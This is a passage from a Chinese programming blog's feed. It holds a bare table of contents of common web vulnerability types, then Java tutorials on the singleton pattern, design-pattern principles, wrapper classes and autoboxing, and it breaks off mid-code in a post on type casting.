title="日志记录和监控不足"></a>日志记录和监控不足</h2>]]></content>
    
    
    <categories>
      
      <category>OWASP常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB常见漏洞-内容目录概括</title>
    <link href="/2021/04/18/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>WEB网站常见漏洞。内容目录概括。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><h3 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h3><h3 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h3><h3 id="4-CRLF注入"><a href="#4-CRLF注入" class="headerlink" title="4.CRLF注入"></a>4.CRLF注入</h3><h3 id="5-Email头注入"><a href="#5-Email头注入" class="headerlink" title="5.Email头注入"></a>5.Email头注入</h3><h3 id="6-Host注入"><a href="#6-Host注入" class="headerlink" title="6.Host注入"></a>6.Host注入</h3><h3 id="7-LDAP注入"><a href="#7-LDAP注入" class="headerlink" title="7.LDAP注入"></a>7.LDAP注入</h3><h3 id="8-OS命令注入"><a href="#8-OS命令注入" class="headerlink" title="8.OS命令注入"></a>8.OS命令注入</h3><h3 id="9-XPath注入"><a href="#9-XPath注入" class="headerlink" title="9.XPath注入"></a>9.XPath注入</h3><h2 id="跨站点脚本-XSS-漏洞"><a href="#跨站点脚本-XSS-漏洞" class="headerlink" title="跨站点脚本(XSS)漏洞"></a>跨站点脚本(XSS)漏洞</h2><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h2 id="XML外部实体-XXE-漏洞"><a href="#XML外部实体-XXE-漏洞" class="headerlink" title="XML外部实体(XXE)漏洞"></a>XML外部实体(XXE)漏洞</h2><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2>]]></content>
    
    
    <categories>
      
      <category>WEB常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA设计模式(二)-单例模式</title>
    <link href="/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%BA%8C)-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <url>/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%BA%8C)-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>JAVA设计模式(二)。单例模式。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>所谓类的单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例。</p><h2 id="单例模式的饿汉式"><a href="#单例模式的饿汉式" class="headerlink" title="单例模式的饿汉式"></a>单例模式的饿汉式</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Bank bank1 = Bank.getOl();<br>        Bank bank2 = Bank.getOl();<br>        System.out.println( bank1 == bank2 );<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">new</span> Bank();<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="单例模式的懒汉式-线程不安全"><a href="#单例模式的懒汉式-线程不安全" class="headerlink" title="单例模式的懒汉式-线程不安全"></a>单例模式的懒汉式-线程不安全</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Bank b1 = Bank.getOl();<br>        Bank b2 = Bank.getOl();<br>        System.out.println(b1 == b2);<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">//不同点</span><br>        <span class="hljs-keyword">if</span>(ol == <span class="hljs-keyword">null</span>) ol = <span class="hljs-keyword">new</span> Bank();<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="单例模式的懒汉式-线程安全"><a href="#单例模式的懒汉式-线程安全" class="headerlink" title="单例模式的懒汉式-线程安全"></a>单例模式的懒汉式-线程安全</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123; <br>        Bank b1 = Bank.getOl();<br>        Bank b2 = Bank.getOl();<br>        System.out.println(b1 == b2);<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">//不同点</span><br>        <span class="hljs-keyword">if</span>(ol == <span class="hljs-keyword">null</span>) ol = <span class="hljs-keyword">new</span> Bank();<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="饿汉式和懒汉式的区别"><a href="#饿汉式和懒汉式的区别" class="headerlink" title="饿汉式和懒汉式的区别"></a>饿汉式和懒汉式的区别</h2><p>懒汉式相较于饿汉式，延迟对象的创建，对于饿汉式来说就是对象加载时间过长。<br>饿汉式是线程安全的，懒汉式有安全和不安全的。</p>]]></content>
    
    
    <categories>
      
      <category>JAVA设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA设计模式(一)-设计模式类型目录及概括</title>
    <link href="/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%B8%80)-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%B1%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%B8%80)-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%B1%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>JAVA设计模式。</p><h1 id="设计模式类型内容概括"><a href="#设计模式类型内容概括" class="headerlink" title="设计模式类型内容概括"></a>设计模式类型内容概括</h1><h2 id="一-创建型模式（5种）"><a href="#一-创建型模式（5种）" class="headerlink" title="一.创建型模式（5种）"></a>一.创建型模式（5种）</h2><h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><h3 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h3><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><h2 id="二-结构型模式（7种）"><a href="#二-结构型模式（7种）" class="headerlink" title="二.结构型模式（7种）"></a>二.结构型模式（7种）</h2><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><h3 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h3><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><h3 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h3><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><h3 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h3><h3 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h3><h2 id="三-行为型模式（11种）"><a href="#三-行为型模式（11种）" class="headerlink" title="三.行为型模式（11种）"></a>三.行为型模式（11种）</h2><h3 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h3><h3 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h3><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><h3 id="迭代子模式"><a href="#迭代子模式" class="headerlink" title="迭代子模式"></a>迭代子模式</h3><h3 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h3><h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><h3 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h3><h3 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h3><h3 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h3><h3 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h3><h3 id="解释器模式"><a href="#解释器模式" class="headerlink" title="解释器模式"></a>解释器模式</h3><hr><h2 id="设计模式简介"><a href="#设计模式简介" class="headerlink" title="设计模式简介"></a>设计模式简介</h2><p>设计模式是在大量的实践中总结和理论化之后优选的代码结构、编程风格、以及解决问题的思考方式。设计模式免去我们自己再思考和摸索。设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p><p>设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。</p><h2 id="设计模式的六大原则"><a href="#设计模式的六大原则" class="headerlink" title="设计模式的六大原则"></a>设计模式的六大原则</h2><p><strong>1、开闭原则（Open Close Principle）</strong></p><p>开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。</p><p><strong>2、里氏代换原则（Liskov Substitution Principle）</strong></p><p>里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</p><p><strong>3、依赖倒转原则（Dependence Inversion Principle）</strong></p><p>这个原则是开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。</p><p><strong>4、接口隔离原则（Interface Segregation Principle）</strong></p><p>这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。</p><p><strong>5、迪米特法则，又称最少知道原则（Demeter Principle）</strong></p><p>最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。</p><p><strong>6、合成复用原则（Composite Reuse Principle）</strong></p><p>合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。</p><h2 id="什么是-GOF（四人帮，全拼-Gang-of-Four）？"><a href="#什么是-GOF（四人帮，全拼-Gang-of-Four）？" class="headerlink" title="什么是 GOF（四人帮，全拼 Gang of Four）？"></a>什么是 GOF（四人帮，全拼 Gang of Four）？</h2><p>在 1994 年，由 Erich Gamma、Richard Helm、Ralph Johnson 和 John Vlissides 四人合著出版了一本名为 Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 - 可复用的面向对象软件元素） 的书，该书首次提到了软件开发中设计模式的概念。</p><p>四位作者合称 GOF（四人帮，全拼 Gang of Four）。他们所提出的设计模式主要是基于以下的面向对象设计原则。</p><blockquote><p>对接口编程而不是对实现编程。<br>优先使用对象组合而不是继承。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>JAVA设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(八)-包装类、装箱拆箱</title>
    <link href="/2021/04/18/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AB)-%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E6%8B%86%E7%AE%B1/"/>
    <url>/2021/04/18/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AB)-%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E6%8B%86%E7%AE%B1/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(八)。包装类、装箱拆箱。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>也可见 《JAVA基础知识复习(一)-正文》博客内容。</p><h2 id="包装类（Wrapper）"><a href="#包装类（Wrapper）" class="headerlink" title="包装类（Wrapper）"></a>包装类（Wrapper）</h2><p>针对八种基本数据类型定义相应的引用类型 — 包装类（封装类）。</p><table><tr><th>基本数据类型</th><th>包装类</th></tr><tr><td>byte</td><td>Byte</td><td rowspan='6'>父类 ：Number</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr></table><h2 id="基本数据类型转换为包装类"><a href="#基本数据类型转换为包装类" class="headerlink" title="基本数据类型转换为包装类"></a>基本数据类型转换为包装类</h2><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> i=<span class="hljs-number">120</span>;<br>       Integer ie = <span class="hljs-keyword">new</span> Integer(i);<br>       System.out.println(ie.toString());<br>       Integer it = <span class="hljs-keyword">new</span> Integer(<span class="hljs-string">&quot;12345&quot;</span>); <span class="hljs-comment">//必须为数字的字符串</span><br>      <span class="hljs-comment">// s = &quot;456789&quot;; </span><br>      <span class="hljs-comment">//Integer it = new Integer(s);</span><br>      <span class="hljs-comment">//输出 456789</span><br>       System.out.println(it.toString());<br><span class="hljs-comment">//       Integer it2 =new Integer(&quot;123abc&quot;); //不能加字母，否则运行时会出错</span><br><span class="hljs-comment">//       System.out.println(it2.toString());</span><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">120</span><br><span class="hljs-number">12345</span><br></code></pre></div></td></tr></table></figure><p>其他的类型用法同样的原理。</p><h2 id="包装类转换为基本数据类型"><a href="#包装类转换为基本数据类型" class="headerlink" title="包装类转换为基本数据类型"></a>包装类转换为基本数据类型</h2><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer it = <span class="hljs-keyword">new</span> Integer(<span class="hljs-number">13</span>);<br>        <span class="hljs-keyword">int</span> i = it.intValue();<br>        System.out.println(i+<span class="hljs-number">1</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">14</span><br></code></pre></div></td></tr></table></figure><h2 id="基本数据类型、包装类转换成-String"><a href="#基本数据类型、包装类转换成-String" class="headerlink" title="基本数据类型、包装类转换成 String"></a>基本数据类型、包装类转换成 String</h2><p>由于基本数据类型与包装类之间可以自动转换，所以这里就把包装类和基本数据类型当成一种来和 String 之间进行转换。</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> num = <span class="hljs-number">10</span>;<br>String str = num + <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">float</span> fl = <span class="hljs-number">12.3f</span>;<br><span class="hljs-keyword">double</span> db = <span class="hljs-number">23.5</span>;<br>String str = String.valueOf(fl);<br>String str1 = String.valueOf(db);<br>System.out.println(str);<br>System.out.println(str1);<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">12.3</span><br><span class="hljs-number">23.5</span><br></code></pre></div></td></tr></table></figure><h2 id="String-转换成基本数据类型、包装类"><a href="#String-转换成基本数据类型、包装类" class="headerlink" title="String 转换成基本数据类型、包装类"></a>String 转换成基本数据类型、包装类</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String str = <span class="hljs-string">&quot;234&quot;</span>; <span class="hljs-comment">//不能写非数字字符</span><br>        <span class="hljs-keyword">int</span> num = Integer.parseInt(str);<br>        System.out.println(num+<span class="hljs-number">1</span>);<br><br>        String str2 = <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment">//只有写true输出才为true，其他的都为false，写1也为false</span><br>        <span class="hljs-keyword">boolean</span> fl = Boolean.parseBoolean(str2);<br>        System.out.println(fl);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">235</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><h2 id="转换图"><a href="#转换图" class="headerlink" title="转换图"></a>转换图</h2><p><img src="https://img-blog.csdnimg.cn/20210418123538329.png"></p><h2 id="自动装箱"><a href="#自动装箱" class="headerlink" title="自动装箱"></a>自动装箱</h2><p>JDK 5.0 新特性。<br>基本数据类型转换成包装类。</p><p>可以理解成，小的转换成大的叫装箱。（这里的小、大表示的是谁包含谁）<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> num = <span class="hljs-number">10</span>;<br>        Integer it = num;<br>        System.out.println(it);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h2 id="自动拆箱"><a href="#自动拆箱" class="headerlink" title="自动拆箱"></a>自动拆箱</h2><p>包装类转换成基本数据类型。</p><p>可以理解成，大的转换成小的叫拆箱。（这里的小、大表示的是谁包含谁）</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer it = <span class="hljs-number">12</span>;<br>        <span class="hljs-keyword">int</span> itt = it;<br>        System.out.println(itt);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(七)-向上、下转型</title>
    <link href="/2021/04/18/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%83)-%E5%90%91%E4%B8%8A%E3%80%81%E4%B8%8B%E8%BD%AC%E5%9E%8B/"/>
    <url>/2021/04/18/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%83)-%E5%90%91%E4%B8%8A%E3%80%81%E4%B8%8B%E8%BD%AC%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(七)。向上、下转型，instanceof 用法。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p>多态的体现。<br>现有，Person 类、Man 类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Person 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span 